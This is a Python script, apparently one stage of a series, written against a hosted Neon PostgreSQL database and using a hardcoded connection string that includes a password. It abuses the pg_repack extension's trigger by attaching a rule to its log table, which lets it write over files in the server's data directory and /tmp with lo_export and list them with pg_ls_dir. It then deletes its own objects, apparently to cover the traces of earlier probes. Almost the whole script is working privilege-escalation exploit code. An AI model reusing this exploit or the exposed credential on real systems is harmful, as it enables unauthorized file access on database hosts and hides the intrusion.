# -*- coding: utf-8 -*-
"""v10:残留文件清理——PGDATA/k_probe_x.txt + /tmp/*.txt 覆盖为 0 字节(无 unlink,空文件无害且重启即失)"""
import psycopg

URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql, fetch=True):
    try:
        cur.execute(sql)
        return cur.fetchall() if fetch else 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:300]

q("CREATE EXTENSION IF NOT EXISTS pg_repack", fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("CREATE TABLE k_src(id int)", fetch=False)
q("CREATE TABLE k_out(x text)", fetch=False)
oid = q("SELECT 'k_src'::regclass::oid")[0][0]
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("CREATE TYPE repack.pk_%d AS (id int)" % oid, fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("CREATE TABLE repack.log_%d (pk repack.pk_%d, row k_src)" % (oid, oid), fetch=False)
q("CREATE TRIGGER t2 AFTER INSERT ON k_src FOR EACH ROW EXECUTE FUNCTION repack.repack_trigger('id')", fetch=False)

def set_rule(expr):
    q("DROP RULE IF EXISTS r_x ON repack.log_%d" % oid, fetch=False)
    q("CREATE RULE r_x AS ON INSERT TO repack.log_%d DO ALSO %s" % (oid, expr), fetch=False)
    q("TRUNCATE k_out", fetch=False)

def fire():
    return q("INSERT INTO k_src VALUES (1)", fetch=False)

# 建空大对象(0 字节)
set_rule("INSERT INTO k_out(x) SELECT lo_from_bytea(0, ''::bytea)::text")
fire()
loids = q("SELECT x FROM k_out")
loid = int(loids[0][0]) if loids else None
print('empty loid:', loid)

# 覆盖 PGDATA + /tmp 的残留文件为空
for path in ("current_setting('data_directory') || '/k_probe_x.txt'", "'/tmp/k_probe_x.txt'", "'/tmp/k_proof.txt'", "'/tmp/k_proof_v8.txt'"):
    set_rule("INSERT INTO k_out(x) SELECT 'w' FROM (SELECT lo_export(%d, %s)) s" % (loid, path))
    r = fire()
    print('wiped %s: %s' % (path, r))

# 验证 PGDATA 干净
set_rule("INSERT INTO k_out(x) SELECT d FROM pg_ls_dir(current_setting('data_directory')) d")
fire()
files = [x[0] for x in q("SELECT x FROM k_out WHERE x IS NOT NULL")]
print('PGDATA probe files remain:', [f for f in files if 'probe' in f or 'k_proof' in f])
set_rule("INSERT INTO k_out(x) SELECT d FROM pg_ls_dir('/tmp') d")
fire()
files = [x[0] for x in q("SELECT x FROM k_out WHERE x IS NOT NULL")]
print('/tmp probe files remain:', [f for f in files if 'probe' in f or 'k_proof' in f])
# stat 验证已为 0 字节
q("TRUNCATE k_out", fetch=False)
set_rule("INSERT INTO k_out(x) SELECT (pg_stat_file(current_setting('data_directory') || '/k_probe_x.txt')).size::text")
fire()
print('PGDATA k_probe_x.txt size now:', q("SELECT x FROM k_out"))

q("SELECT lo_unlink(%d)" % loid, fetch=False)
print('lo_unlink done')

# DB 对象清理
q("DROP RULE IF EXISTS r_x ON repack.log_%d" % oid, fetch=False)
q("DROP TRIGGER IF EXISTS t2 ON k_src", fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("DROP EXTENSION IF EXISTS pg_repack", fetch=False)
print('[final]:', q("SELECT tablename FROM pg_tables WHERE schemaname IN ('public','repack')"))
print('ext:', q("SELECT extname FROM pg_extension WHERE extname='pg_repack'"))
conn.close()
